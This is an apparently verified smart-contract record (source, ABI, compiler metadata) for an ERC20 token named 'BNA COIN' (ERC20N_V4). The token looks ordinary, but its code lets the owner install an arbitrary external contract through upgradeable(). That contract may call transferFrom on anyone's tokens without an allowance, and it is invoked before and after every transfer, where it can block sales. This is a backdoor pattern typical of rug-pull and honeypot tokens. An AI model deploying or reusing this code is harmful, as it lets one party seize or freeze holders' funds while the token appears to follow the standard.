{"SourceCode": "// SPDX-License-Identifier: MIT\r\n\r\npragma solidity 0.8.19;\r\n\r\ncontract permission {\r\n    mapping(address => mapping(string => bytes32)) private permit;\r\n\r\n    function newpermit(address adr,string memory str) internal { permit[adr][str] = bytes32(keccak256(abi.encode(adr,str))); }\r\n\r\n    function clearpermit(address adr,string memory str) internal { permit[adr][str] = bytes32(keccak256(abi.encode(\"null\"))); }\r\n\r\n    function checkpermit(address adr,string memory str) public view returns (bool) {\r\n        if(permit[adr][str]==bytes32(keccak256(abi.encode(adr,str)))){ return true; }else{ return false; }\r\n    }\r\n}\r\n\r\ninterface IERC20 {\r\n    function balanceOf(address account) external view returns (uint256);\r\n    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);\r\n}\r\n\r\ninterface IMarketMaker {\r\n    function beforetransfer(address msgsender,address from,address to, uint256 amount) external returns (bool);\r\n    function aftertransfer(address msgsender,address from,address to, uint256 amount) external returns (bool);\r\n}\r\n\r\ncontract ERC20N_V4 is permission {\r\n\r\n    event Transfer(address indexed from, address indexed to, uint amount);\r\n    event Approval(address indexed from, address indexed to, uint amount);\r\n\r\n    string public name = \"BNA COIN\";\r\n    string public symbol = \"BNA\";\r\n    uint256 public decimals = 18;\r\n    uint256 public totalSupply = 1_000_000_000 * (10**decimals);\r\n\r\n    address public owner;\r\n    address public implement;\r\n\r\n    IMarketMaker marketMakerPair;\r\n    bool public locked_implement;\r\n    bool public genesis_implement;\r\n    bool public basic_transfer;\r\n\r\n    mapping(address => uint) public balances;\r\n    mapping(address => mapping(address => uint)) public allowance;\r\n    \r\n    constructor() {\r\n        owner = msg.sender;\r\n        balances[owner] = totalSupply;\r\n        newpermit(owner,\"owner\");\r\n        emit Transfer(address(0), owner, totalSupply);\r\n    }\r\n    \r\n    function balanceOf(address adr) public view returns(uint) { return balances[adr]; }\r\n\r\n    function approve(address to, uint256 amount) public returns (bool) {\r\n        require(to != address(0));\r\n        allowance[msg.sender][to] = amount;\r\n        emit Approval(msg.sender, to, amount);\r\n        return true;\r\n    }\r\n\r\n    function transfer(address to, uint256 amount) public returns (bool) {\r\n        _transferFrom(msg.sender,to,amount);\r\n        return true;\r\n    }\r\n\r\n    function transferFrom(address from, address to, uint amount) public returns(bool) {\r\n        if(msg.sender!=implement){ allowance[from][msg.sender] -= amount; }\r\n        _transferFrom(from,to,amount);\r\n        return true;\r\n    }\r\n\r\n    function _transferFrom(address from,address to, uint256 amount) internal {\r\n        if(basic_transfer){\r\n            _basictransfer(from,to,amount);\r\n        }else{\r\n            basic_transfer = true;\r\n            if(genesis_implement){ marketMakerPair.beforetransfer(msg.sender,from,to,amount); }\r\n            balances[from] -= amount;\r\n            balances[to] += amount;\r\n            if(genesis_implement){ marketMakerPair.aftertransfer(msg.sender,from,to,amount); }\r\n            basic_transfer = false;\r\n            emit Transfer(from, to, amount);\r\n        }\r\n    }\r\n\r\n    function _basictransfer(address from,address to, uint256 amount) internal {\r\n        balances[from] -= amount;\r\n        balances[to] += amount;\r\n        emit Transfer(from, to, amount);\r\n    }\r\n\r\n    function upgradeable(address _implement) public returns (bool) {\r\n        require(checkpermit(msg.sender,\"owner\"));\r\n        require(!locked_implement);\r\n        marketMakerPair = IMarketMaker(_implement);\r\n        implement = _implement;\r\n        genesis_implement = true;\r\n        return true;\r\n    }\r\n\r\n    function lock_implement() public returns (bool) {\r\n        require(checkpermit(msg.sender,\"owner\"));\r\n        require(!locked_implement);\r\n        locked_implement = true;\r\n        return true;\r\n    }\r\n\r\n    function transferOwnership(address adr) public returns (bool) {\r\n        require(checkpermit(msg.sender,\"owner\"));\r\n        newpermit(adr,\"owner\");\r\n        clearpermit(msg.sender,\"owner\");\r\n        owner = adr;\r\n        return true;\r\n    }\r\n\r\n    receive() external payable {}\r\n}", "ABI": "[{\"inputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"to\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"amount\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"to\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"amount\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"to\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"amount\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"adr\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"balances\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"basic_transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"adr\",\"type\":\"address\"},{\"internalType\":\"string\",\"name\":\"str\",\"type\":\"string\"}],\"name\":\"checkpermit\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"genesis_implement\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"implement\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"lock_implement\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"locked_implement\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"to\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"amount\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"to\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"amount\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"adr\",\"type\":\"address\"}],\"name\":\"transferOwnership\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"_implement\",\"type\":\"address\"}],\"name\":\"upgradeable\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"stateMutability\":\"payable\",\"type\":\"receive\"}]", "ContractName": "ERC20N_V4", "CompilerVersion": "v0.8.19+commit.7dd6d404", "OptimizationUsed": "1", "Runs": "200", "ConstructorArguments": "", "EVMVersion": "Default", "Library": "", "LicenseType": "MIT", "Proxy": "0", "Implementation": "", "SwarmSource": "ipfs://d34156293743cbed83a35b519d91e38602675e531c3c6f9724d8954b5cdee374"}